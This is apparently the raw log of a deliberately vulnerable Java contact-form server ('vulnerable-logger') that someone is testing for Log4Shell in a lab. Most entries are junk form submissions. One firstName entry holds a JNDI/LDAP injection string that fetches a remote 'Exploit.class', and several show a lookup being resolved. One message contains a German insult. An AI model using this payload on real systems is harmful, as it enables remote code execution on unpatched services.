23:42:41.574 [main] INFO  ContactFormServer - Server started on port 1234
23:43:06.020 [HTTP-Dispatcher] INFO  ContactFormServer - Received contact form:
23:43:06.022 [HTTP-Dispatcher] INFO  ContactFormServer - firstName:
23:43:06.023 [HTTP-Dispatcher] INFO  ContactFormServer - Reference Class Name: foo

23:43:06.055 [HTTP-Dispatcher] INFO  ContactFormServer - lastName:
23:43:06.055 [HTTP-Dispatcher] INFO  ContactFormServer - sdf
23:43:06.055 [HTTP-Dispatcher] INFO  ContactFormServer - phone:
23:43:06.055 [HTTP-Dispatcher] INFO  ContactFormServer - 12333123
23:43:06.055 [HTTP-Dispatcher] INFO  ContactFormServer - message:
23:43:06.055 [HTTP-Dispatcher] INFO  ContactFormServer - sdfsdfsdf
23:43:06.055 [HTTP-Dispatcher] INFO  ContactFormServer - email:
23:43:06.056 [HTTP-Dispatcher] INFO  ContactFormServer - j@g.com
23:47:21.885 [HTTP-Dispatcher] INFO  ContactFormServer - Received contact form:
23:47:21.885 [HTTP-Dispatcher] INFO  ContactFormServer - firstName:
23:47:21.885 [HTTP-Dispatcher] INFO  ContactFormServer - Reference Class Name: foo

23:47:21.893 [HTTP-Dispatcher] INFO  ContactFormServer - lastName:
23:47:21.893 [HTTP-Dispatcher] INFO  ContactFormServer - hey
23:47:21.893 [HTTP-Dispatcher] INFO  ContactFormServer - phone:
23:47:21.893 [HTTP-Dispatcher] INFO  ContactFormServer - 2345
23:47:21.893 [HTTP-Dispatcher] INFO  ContactFormServer - message:
23:47:21.894 [HTTP-Dispatcher] INFO  ContactFormServer - j
23:47:21.894 [HTTP-Dispatcher] INFO  ContactFormServer - email:
23:47:21.894 [HTTP-Dispatcher] INFO  ContactFormServer - j@g.com
23:57:01.652 [main] INFO  ContactFormServer - Server started on port 1234
23:58:07.850 [HTTP-Dispatcher] INFO  ContactFormServer - Received contact form:
23:58:07.851 [HTTP-Dispatcher] INFO  ContactFormServer - firstName:
23:58:07.852 [HTTP-Dispatcher] INFO  ContactFormServer - Reference Class Name: foo

23:58:07.992 [HTTP-Dispatcher] INFO  ContactFormServer - lastName:
23:58:07.992 [HTTP-Dispatcher] INFO  ContactFormServer - sdf
23:58:07.993 [HTTP-Dispatcher] INFO  ContactFormServer - phone:
23:58:07.993 [HTTP-Dispatcher] INFO  ContactFormServer - 13
23:58:07.993 [HTTP-Dispatcher] INFO  ContactFormServer - message:
23:58:07.993 [HTTP-Dispatcher] INFO  ContactFormServer - dsf
23:58:07.994 [HTTP-Dispatcher] INFO  ContactFormServer - email:
23:58:07.995 [HTTP-Dispatcher] INFO  ContactFormServer - j@g.com
00:07:09.898 [HTTP-Dispatcher] INFO  ContactFormServer - Received contact form:
00:07:09.900 [HTTP-Dispatcher] INFO  ContactFormServer - firstName:
00:07:09.900 [HTTP-Dispatcher] INFO  ContactFormServer - Reference Class Name: foo

00:07:10.023 [HTTP-Dispatcher] INFO  ContactFormServer - lastName:
00:07:10.023 [HTTP-Dispatcher] INFO  ContactFormServer - hsd
00:07:10.023 [HTTP-Dispatcher] INFO  ContactFormServer - phone:
00:07:10.024 [HTTP-Dispatcher] INFO  ContactFormServer - 234
00:07:10.024 [HTTP-Dispatcher] INFO  ContactFormServer - message:
00:07:10.025 [HTTP-Dispatcher] INFO  ContactFormServer - sdf
00:07:10.025 [HTTP-Dispatcher] INFO  ContactFormServer - email:
00:07:10.025 [HTTP-Dispatcher] INFO  ContactFormServer - j@g.com
00:17:08.964 [main] INFO  ContactFormServer - Server started on port 1234
00:17:18.349 [HTTP-Dispatcher] INFO  ContactFormServer - Received contact form:
00:17:18.351 [HTTP-Dispatcher] INFO  ContactFormServer - firstName:
00:17:18.354 [HTTP-Dispatcher] INFO  ContactFormServer - sdf
00:17:18.354 [HTTP-Dispatcher] INFO  ContactFormServer - lastName:
00:17:18.355 [HTTP-Dispatcher] INFO  ContactFormServer - sdf
00:17:18.355 [HTTP-Dispatcher] INFO  ContactFormServer - phone:
00:17:18.355 [HTTP-Dispatcher] INFO  ContactFormServer - 123
00:17:18.355 [HTTP-Dispatcher] INFO  ContactFormServer - message:
00:17:18.355 [HTTP-Dispatcher] INFO  ContactFormServer - sdf
00:17:18.355 [HTTP-Dispatcher] INFO  ContactFormServer - email:
00:17:18.355 [HTTP-Dispatcher] INFO  ContactFormServer - j@g.com
00:19:04.546 [HTTP-Dispatcher] INFO  ContactFormServer - Received contact form:
00:19:04.546 [HTTP-Dispatcher] INFO  ContactFormServer - firstName:
00:19:04.546 [HTTP-Dispatcher] INFO  ContactFormServer - ${jndi:ldap//0.0.0.0:1389/Exploit.class}
00:19:04.585 [HTTP-Dispatcher] INFO  ContactFormServer - lastName:
00:19:04.585 [HTTP-Dispatcher] INFO  ContactFormServer - fds
00:19:04.586 [HTTP-Dispatcher] INFO  ContactFormServer - phone:
00:19:04.586 [HTTP-Dispatcher] INFO  ContactFormServer - 33
00:19:04.586 [HTTP-Dispatcher] INFO  ContactFormServer - message:
00:19:04.586 [HTTP-Dispatcher] INFO  ContactFormServer - sdf
00:19:04.586 [HTTP-Dispatcher] INFO  ContactFormServer - email:
00:19:04.587 [HTTP-Dispatcher] INFO  ContactFormServer - j@g.com
00:19:34.277 [HTTP-Dispatcher] INFO  ContactFormServer - Received contact form:
00:19:34.278 [HTTP-Dispatcher] INFO  ContactFormServer - firstName:
00:19:34.278 [HTTP-Dispatcher] INFO  ContactFormServer - Reference Class Name: foo

00:19:34.438 [HTTP-Dispatcher] INFO  ContactFormServer - lastName:
00:19:34.439 [HTTP-Dispatcher] INFO  ContactFormServer - sdf
00:19:34.440 [HTTP-Dispatcher] INFO  ContactFormServer - phone:
00:19:34.440 [HTTP-Dispatcher] INFO  ContactFormServer - 123
00:19:34.440 [HTTP-Dispatcher] INFO  ContactFormServer - message:
00:19:34.440 [HTTP-Dispatcher] INFO  ContactFormServer - sdf
00:19:34.440 [HTTP-Dispatcher] INFO  ContactFormServer - email:
00:19:34.440 [HTTP-Dispatcher] INFO  ContactFormServer - j@g.com
00:22:23.942 [HTTP-Dispatcher] INFO  ContactFormServer - Received contact form:
00:22:23.945 [HTTP-Dispatcher] INFO  ContactFormServer - firstName:
00:22:23.946 [HTTP-Dispatcher] INFO  ContactFormServer - Reference Class Name: foo

00:22:23.960 [HTTP-Dispatcher] INFO  ContactFormServer - lastName:
00:22:23.961 [HTTP-Dispatcher] INFO  ContactFormServer - sdf
00:22:23.961 [HTTP-Dispatcher] INFO  ContactFormServer - phone:
00:22:23.962 [HTTP-Dispatcher] INFO  ContactFormServer - 324
00:22:23.962 [HTTP-Dispatcher] INFO  ContactFormServer - message:
00:22:23.963 [HTTP-Dispatcher] INFO  ContactFormServer - dfg
00:22:23.966 [HTTP-Dispatcher] INFO  ContactFormServer - email:
00:22:23.967 [HTTP-Dispatcher] INFO  ContactFormServer - j@g.com
00:49:05.661 [main] INFO  ContactFormServer - Server started on port 1234
00:49:24.919 [HTTP-Dispatcher] INFO  ContactFormServer - Received contact form:
00:49:24.920 [HTTP-Dispatcher] INFO  ContactFormServer - firstName:
00:49:24.920 [HTTP-Dispatcher] INFO  ContactFormServer - Reference Class Name: foo

00:49:25.044 [HTTP-Dispatcher] INFO  ContactFormServer - lastName:
00:49:25.045 [HTTP-Dispatcher] INFO  ContactFormServer - fick
00:49:25.045 [HTTP-Dispatcher] INFO  ContactFormServer - phone:
00:49:25.045 [HTTP-Dispatcher] INFO  ContactFormServer - 123
00:49:25.045 [HTTP-Dispatcher] INFO  ContactFormServer - message:
00:49:25.046 [HTTP-Dispatcher] INFO  ContactFormServer - dich, du drekciger bastard
00:49:25.049 [HTTP-Dispatcher] INFO  ContactFormServer - email:
00:49:25.049 [HTTP-Dispatcher] INFO  ContactFormServer - j@g.com
00:51:28.328 [HTTP-Dispatcher] INFO  ContactFormServer - Received contact form:
00:51:28.328 [HTTP-Dispatcher] INFO  ContactFormServer - firstName:
00:51:28.328 [HTTP-Dispatcher] INFO  ContactFormServer - Reference Class Name: foo

00:51:28.356 [HTTP-Dispatcher] INFO  ContactFormServer - lastName:
00:51:28.360 [HTTP-Dispatcher] INFO  ContactFormServer - sad
00:51:28.361 [HTTP-Dispatcher] INFO  ContactFormServer - phone:
00:51:28.363 [HTTP-Dispatcher] INFO  ContactFormServer - 123
00:51:28.368 [HTTP-Dispatcher] INFO  ContactFormServer - message:
00:51:28.369 [HTTP-Dispatcher] INFO  ContactFormServer - dsf
00:51:28.369 [HTTP-Dispatcher] INFO  ContactFormServer - email:
00:51:28.369 [HTTP-Dispatcher] INFO  ContactFormServer - j@g.com
01:05:58.279 [main] INFO  vulnerable-logger - Server started on port 1234
01:06:18.368 [HTTP-Dispatcher] INFO  vulnerable-logger - Received contact form:
01:06:18.371 [HTTP-Dispatcher] INFO  vulnerable-logger - firstName:
01:06:18.371 [HTTP-Dispatcher] INFO  vulnerable-logger - Reference Class Name: foo

01:06:18.430 [HTTP-Dispatcher] INFO  vulnerable-logger - lastName:
01:06:18.430 [HTTP-Dispatcher] INFO  vulnerable-logger - sdf
01:06:18.431 [HTTP-Dispatcher] INFO  vulnerable-logger - phone:
01:06:18.431 [HTTP-Dispatcher] INFO  vulnerable-logger - 123
01:06:18.431 [HTTP-Dispatcher] INFO  vulnerable-logger - message:
01:06:18.431 [HTTP-Dispatcher] INFO  vulnerable-logger - dsf
01:06:18.431 [HTTP-Dispatcher] INFO  vulnerable-logger - email:
01:06:18.431 [HTTP-Dispatcher] INFO  vulnerable-logger - j@g.com
